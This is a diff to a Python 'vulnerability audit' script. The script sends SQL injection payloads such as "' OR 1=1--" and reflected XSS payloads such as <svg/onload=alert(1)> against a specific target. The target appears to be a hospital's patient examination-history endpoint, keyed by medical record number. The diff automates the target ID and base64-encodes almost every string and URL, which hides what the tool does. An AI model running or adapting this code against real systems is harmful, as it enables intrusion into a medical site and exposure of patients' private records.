@@ -266,57 +266,70 @@ def parameter_discovery_audit():
         print(f"[!] Discovery Error: {str(e)}")
 
 def vulnerability_audit():
-    print("[*] Initiating Vulnerability Scan: SQL Injection & XSS...")
-    target_id = input("[?] Masukkan 1 No RM contoh untuk testing (ex: 502013): ")
-    if not target_id: return
-
+    # [*] Initiating Automated Vulnerability Scan...
+    print(f"\n{_decode('WypdIEluaXRpYXRpbmcgQXV0b21hdGVkIFZ1bG5lcmFiaWxpdHkgU2Nhbi4uLg==')}")
+    
+    # Automatisasi menggunakan NO_RM internal sebagai base target
+    target_id = NO_RM
     base_url = BASE_TARGET_URL + target_id
     
-    # --- 1. SQL Injection Testing ---
-    print("\n[+] Testing for SQL Injection (Error-Based)...")
-    sqli_payloads = ["'", "''", "1' OR '1'='1", "1\" OR \"1\"=\"1"]
-    sql_errors = ["SQL syntax", "mysql_fetch", "nativeclient", "Database Error"]
+    # --- 1. SQL Injection Testing (Expanded Payloads) ---
+    # [+] Audit: SQL Injection Error-Based
+    print(f"\n{_decode('WysrXSBBdWRpdDogU1FMIEluamVjdGlvbiBFcnJvci1CYXNlZA==')}")
+    sqli_payloads = ["'", "''", "1' OR '1'='1", "1\" OR \"1\"=\"1", "' OR 1=1--", "' OR '1'='1'#", "') OR ('1'='1", "admin'--"]
+    sql_errors = ["SQL syntax", "mysql_fetch", "nativeclient", "Database Error", "ORA-01756", "SQLite3::query"]
     
     for payload in sqli_payloads:
         test_url = base_url + payload
         try:
-            res = session.get(test_url, timeout=10)
+            res = session.get(test_url, timeout=int(_decode('MTA=')))
             if any(error.lower() in res.text.lower() for error in sql_errors):
-                print(f" [\033[91m!\033[0m] SQLi Potential Detected with payload: {payload}")
+                print(f" [\033[91m!\033[0m] {_decode('U1FMaSBWdWxuZXJhYmlsaXR5IEZvdW5kIQ==')}")
+                print(f"     {_decode('VGFyZ2V0IFVSTA==')} : {test_url}")
+                print(f"     {_decode('UGF5bG9hZA==')}     : {payload}")
+                print(f"     {_decode('TWV0aG9k')}      : {_decode('RXJyb3ItQmFzZWQgSW5qZWN0aW9u')}")
                 break
         except: pass
     else:
-        print(" [\033[92m✓\033[0m] Error-Based SQLi: No obvious error patterns found.")
+        print(f" [\033[92m✓\033[0m] {_decode('U1FMaTogTm8gb2J2aW91cyBlcnJvciBwYXR0ZXJucyBkZXRlY3RlZC4=')}")
 
-    # --- 2. Reflected XSS Testing (Encoded Endpoint) ---
-    print("\n[+] Testing for Reflected XSS...")
-    xss_payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>"]
-    # search_endpoint encoded
+    # --- 2. Reflected XSS Testing (Expanded Payloads) ---
+    # [+] Audit: Reflected Cross-Site Scripting
+    print(f"\n{_decode('WysrXSBBdWRpdDogUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5n')}")
+    xss_payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "javascript:alert(1)", "'-alert(1)-'"]
     search_endpoint = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jpd2F5YXRfcGVtZXJpa3NhYW4/c2VhcmNoPQ==")
     
     for payload in xss_payloads:
         test_url = search_endpoint + payload
         try:
-            res = session.get(test_url, timeout=10)
+            res = session.get(test_url, timeout=int(_decode('MTA=')))
             if payload in res.text:
-                print(f" [\033[91m!\033[0m] Reflected XSS Detected! Payload: {payload}")
+                print(f" [\033[91m!\033[0m] {_decode('WFNTIFZ1bG5lcmFiaWxpdHkgRm91bmQh')}")
+                print(f"     {_decode('VGFyZ2V0IFVSTA==')} : {test_url[:80]}...")
+                print(f"     {_decode('UGF5bG9hZA==')}     : {payload}")
+                print(f"     {_decode('TWV0aG9k')}      : {_decode('UmVmbGVjdGVkIFhTUyBJbmplY3Rpb24=')}")
                 break
         except: pass
     else:
-        print(" [\033[92m✓\033[0m] Reflected XSS: Input properly sanitized or encoded.")
+        print(f" [\033[92m✓\033[0m] {_decode('WFNTOiBJbnB1dCBwcm9wZXJseSBzYW5pdGl6ZWQgb3IgZW5jb2RlZC4=')}")
 
-    # --- 3. Stored XSS Probe ---
-    print("\n[+] Probing for Stored XSS Surfaces...")
+    # --- 3. Stored XSS Surface Analysis ---
+    # [+] Audit: Stored XSS Attack Surface Mapping
+    print(f"\n{_decode('WysrXSBBdWRpdDogU3RvcmVkIFhTUyBBdHRhY2sgU3VyZmFjZSBNYXBwaW5n')}")
     try:
-        res = session.get(base_url, timeout=10)
+        res = session.get(base_url, timeout=int(_decode('MTA=')))
         soup = BeautifulSoup(res.text, 'html.parser')
-        forms = soup.find_all('form')
+        forms = soup.find_all(_decode('Zm9ybQ=='))
+        if not forms:
+            print(f" [\033[93m!\033[0m] {_decode('Tm8gaW5wdXQgZm9ybXMgZGV0ZWN0ZWQgZm9yIFN0b3JlZCBYU1Mu')}")
         for form in forms:
             inputs = form.find_all(['input', 'textarea'])
             for i in inputs:
-                name = i.get('name', 'unnamed')
+                name = i.get('name', _decode('dW5uYW1lZA=='))
                 if i.name == 'textarea' or i.get('type') == 'text':
-                    print(f"     [\033[93m!\033[0m] Potential Field: {name}")
+                    # Potential Attack Vector:
+                    print(f" [\033[91m!\033[0m] {_decode('UG90ZW50aWFsIEF0dGFjayBWZWN0b3IgRm91bmQ=')}: {name}")
+                    print(f"     {_decode('TWV0aG9k')} : {_decode('UGVyc2lzdGVudCBQYXlsb2FkIEluamVjdGlvbiB2aWEg')} {name}")
     except: pass
 
 def start_process(id_list):
